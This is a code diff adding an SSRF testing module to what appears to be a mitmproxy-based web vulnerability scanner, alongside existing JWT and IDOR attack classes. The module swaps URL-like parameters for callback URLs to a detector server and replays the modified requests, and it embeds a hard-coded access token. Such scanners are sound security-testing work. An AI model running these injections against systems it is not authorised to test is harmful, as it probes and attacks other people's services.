@@ -2,6 +2,10 @@ import json
 from mitmproxy import http
 from helpers import *
 import json, hashlib
+from constants import DOMAIN_REGEX_STRING, IP_REGEX_STRING,PATH_REGEX_STRING, DETECTOR_SERVER_HOST, DETECTOR_SERVER_PORT, PROXY_HOST, PROXY_PORT
+import time
+from uuid import uuid4
+import threading
 
 
 class RerouteAgent:
@@ -69,6 +73,88 @@ class JWTNoneAlgAttack:
                 pass # attack failed
         else:
             pass # not a replayed request
+
+
+class SSRFAttack:
+    ATTACK_LABEL = 'SSRF'
+    pulse_active = False
+    possible_ssrf_flows = dict()
+
+
+    def build_ssrf_attack_url(self, token):
+        return f'http://{DETECTOR_SERVER_HOST}:{DETECTOR_SERVER_PORT}/report_ssrf/{token}'
+
+
+    def create_ssrf_attack(self, flow: http.HTTPFlow, param_location, param_name):
+        ssrf_attack_token = uuid4().hex  # generate a random token
+        self.possible_ssrf_flows[ssrf_attack_token] = flow
+        attack_flow = flow.copy()
+        attack_flow.label = self.ATTACK_LABEL
+        ssrf_attack_url = self.build_ssrf_attack_url(ssrf_attack_token)
+        if param_location == 'query':
+            attack_flow.request.query[param_name] = ssrf_attack_url # use an attack url with a random token
+            replay_flow(attack_flow)
+        if param_location == 'urlencoded_form':
+            attack_flow.request.urlencoded_form[param_name] = ssrf_attack_url # use an attack url with a random token
+            replay_flow(attack_flow)
+
+
+    def send_pulse_request(self):
+        requests.get(
+            f'http://{DETECTOR_SERVER_HOST}:{DETECTOR_SERVER_PORT}/get_reports',
+            params={
+                'access_token': 'b43c9fe7a5c16adfbf0027f6bded4f0b0df47632c0eacfb7d72301c27124a288',
+                'pulse_request_id': uuid4().hex,
+            },
+            proxies= {
+                'http': f'http://{PROXY_HOST}:{PROXY_PORT}',
+            },
+        )
+
+
+    def activate_pulsing(self):
+        while self.pulse_active:
+            self.send_pulse_request()
+            print('-> SSRF pulse..')
+            time.sleep(6)
+        return
+
+
+    def is_param_testable(self, param_value):
+        for REGEX in [ DOMAIN_REGEX_STRING, PATH_REGEX_STRING, IP_REGEX_STRING]:
+            if re.match(REGEX, param_value):
+                return True
+        return False
+    
+
+    def request(self, flow: http.HTTPFlow):
+        if hasattr(flow, 'ignore') or hasattr(flow, 'label') or not is_request_in_scope(flow):
+            return
+
+        for param_name, param_value in flow.request.query.items():
+            if self.is_param_testable(param_value):
+                self.create_ssrf_attack(flow, 'query', param_name)
+                if not self.pulse_active:
+                    self.pulse_active = True
+                    print('SSRF pulse activated..')
+                    threading.Thread(target=self.activate_pulsing).start()  # send a pulse
+
+        for param_name, param_value in flow.request.urlencoded_form.items():
+            if self.is_param_testable(param_value):
+                self.create_ssrf_attack(flow, 'urlencoded_form', param_name)
+                if not self.pulse_active:
+                    self.pulse_active = True
+                    print('pulse activated')
+                    threading.Thread(target=self.activate_pulsing).start()  # send a pulse
+
+
+    def response(self, flow: http.HTTPFlow):       
+        if flow.response.headers.get('Pulse-Request-Id', None) and flow.response.headers['Pulse-Request-Id'] == flow.request.query['pulse_request_id']:
+            reponse = flow.response.json()
+            for token in set(reponse):
+                if token in self.possible_ssrf_flows.keys(): 
+                    print_attack_success(self.ATTACK_LABEL, self.possible_ssrf_flows[token])
+                    report_attack(self.ATTACK_LABEL, self.possible_ssrf_flows[token])
 
 
 class IdorAttack:
@@ -148,7 +234,6 @@ class IdorAttack:
     def request(self, flow: http.HTTPFlow):
         if hasattr(flow.request, 'ignore'):
             return
-        # print(self.get_user_session_fingerprint(flow), '|', is_request_in_scope(flow), '|', flow.request)
 
 
     def response(self, flow: http.HTTPFlow):
